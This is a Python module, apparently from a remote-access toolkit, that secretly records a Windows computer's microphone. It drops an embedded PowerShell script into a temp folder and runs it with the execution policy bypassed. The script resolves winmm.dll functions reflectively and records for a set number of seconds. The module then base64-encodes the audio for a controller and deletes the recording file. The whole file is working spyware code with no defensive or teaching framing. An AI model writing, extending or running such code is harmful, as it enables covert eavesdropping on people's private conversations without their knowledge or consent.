import os
import os.path
import subprocess
from base64 import b64encode





#------------------------------
#Variable for modules to run
FOLDER_NAME = "MICROPHONE4567"
FOLDER_PATH = os.path.expandvars(os.getenv("temp") + f"\\{FOLDER_NAME}")
MICROPHONE_RECORD_SCRIPT_PATH = os.path.expandvars(FOLDER_PATH + f"\\record-audio.ps1")
OUTPUT_FILE_RECORDING_PATH = os.path.expandvars(FOLDER_PATH+"\\recording.wav")
#-------------------------------


MICROPHONE_RECORD_SCRIPT = """
[OutputType([System.IO.FileInfo])]
    Param
    (
        [Parameter( Position = 0, Mandatory = $True)]
        [ValidateScript({Split-Path $_ | Test-Path})]
        [String] $Path,
        [Parameter( Position = 1, Mandatory = $False)]
        [Int] $Length = 30,
        [Parameter( Position = 2, Mandatory = $False)]
        [String] $Alias = $(-join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_}))

    )

    #Get-DelegateType from Wonttakename
    function Local:Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }

    #Get-ProcAddress from Wonttakename
    function local:Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
        
        # Return the address of the function
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    } 

    #Initialize and call LoadLibrary on our required DLL
    $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
    $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
    $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
    $HND = $null
    $HND = $LoadLibrary.Invoke('winmm.dll')
    if ($HND -eq $null)
    {
        Throw 'Failed to aquire handle to winmm.dll'
    }

    #Initialize the function call to count devices
    $waveInGetNumDevsAddr = $null
    $waveInGetNumDevsAddr = Get-ProcAddress winmm.dll waveInGetNumDevs
    $waveInGetNumDevsDelegate = Get-DelegateType @() ([Uint32])
    if ($waveInGetNumDevsAddr -eq $null)
    {
        Throw 'Failed to aquire address to WaveInGetNumDevs'
    }
    $waveInGetNumDevs = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($waveInGetNumDevsAddr, $waveInGetNumDevsDelegate)

    #Initilize the function call to record audio
    $mciSendStringAddr = $null
    $mciSendStringAddr = Get-ProcAddress winmm.dll mciSendStringA
    $mciSendStringDelegate = Get-DelegateType @([String],[String],[UInt32],[IntPtr]) ([Uint32])
    if ($mciSendStringAddr -eq $null)
    {
        Throw 'Failed to aquire address to mciSendStringA'
    }
    $mciSendString = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mciSendStringAddr, $mciSendStringDelegate)

    #Initialize the ability to resolve MCI Errors
    $mciGetErrorStringAddr = $null
    $mciGetErrorStringAddr = Get-ProcAddress winmm.dll mciGetErrorStringA
    $mciGetErrorStringDelegate = Get-DelegateType @([UInt32],[Text.StringBuilder],[UInt32]) ([bool])
    if ($mciGetErrorStringAddr -eq $null)
    {
        Throw 'Failed to aquire address to mciGetErrorString'
    }
    $mciGetErrorString = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mciGetErrorStringAddr,$mciGetErrorStringDelegate)

    #Get device count
    $DeviceCount = $waveInGetNumDevs.Invoke()

    if ($DeviceCount -gt 0)
    {

        #Define buffer for MCI errors. https://msdn.microsoft.com/en-us/library/windows/desktop/dd757153(v=vs.85).aspx
        $errmsg = New-Object Text.StringBuilder 150

        #Open an alias
        $rtnVal = $mciSendString.Invoke("open new Type waveaudio Alias $alias",'',0,0)
        if ($rtnVal -ne 0) {$mciGetErrorString.Invoke($rtnVal,$errmsg,150); $msg=$errmsg.ToString();Throw "MCI Error ($rtnVal): $msg"}
        
        #Call recording function
        $rtnVal = $mciSendString.Invoke("record $alias", '', 0, 0)
        if ($rtnVal -ne 0) {$mciGetErrorString.Invoke($rtnVal,$errmsg,150); $msg=$errmsg.ToString();Throw "MCI Error ($rtnVal): $msg"}
        
        Start-Sleep -s $Length

        #save recorded audio to disk
        $rtnVal = $mciSendString.Invoke("save $alias `"$path`"", '', 0, 0)
        if ($rtnVal -ne 0) {$mciGetErrorString.Invoke($rtnVal,$errmsg,150); $msg=$errmsg.ToString();Throw "MCI Error ($rtnVal): $msg"}

        #terminate alias
        $rtnVal = $mciSendString.Invoke("close $alias", '', 0, 0);
        if ($rtnVal -ne 0) {$mciGetErrorString.Invoke($rtnVal,$errmsg,150); $msg=$errmsg.ToString();Throw "MCI Error ($rtnVal): $msg"}

        $OutFile = Get-ChildItem -path $path 
        Write-Output $OutFile

    }
    else
    {
        Throw 'Failed to enumerate any recording devices'
    }
}
"""




def run_command(command):
    out, err = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
    return out + err


def microphone_recorder(record_duration,outputfilepath):
    #Checks if folder exists or not if not exists creates one
    if not os.path.exists(FOLDER_PATH):
        os.makedirs(FOLDER_PATH)
    #Checks if script is present or not if not present creates the script
    if not os.path.exists(MICROPHONE_RECORD_SCRIPT_PATH):
        f = open(MICROPHONE_RECORD_SCRIPT_PATH, 'w')
        f.write(MICROPHONE_RECORD_SCRIPT)
        f.close()
    #Get the screenshot
    command = f"powershell -ep Bypass {MICROPHONE_RECORD_SCRIPT_PATH} -Length {str(record_duration)} -Path {outputfilepath}"
    print(run_command(command))
    if os.path.exists(os.path.expandvars(outputfilepath)):
        return True
    else:
        return False

def run(options):
    record_time = int(options["record_time"])
    if microphone_recorder(record_time,OUTPUT_FILE_RECORDING_PATH):
        with open(OUTPUT_FILE_RECORDING_PATH,'rb') as f:
            data = f.read()
            f.close()
        raw_data = b64encode(data)

        print(raw_data)
        run_command(f"rm -rf  + {OUTPUT_FILE_RECORDING_PATH}")
    else:
        print("No Recorded File Found")
    

if __name__ == '__main__':
    print(microphone_recorder(30,OUTPUT_FILE_RECORDING_PATH))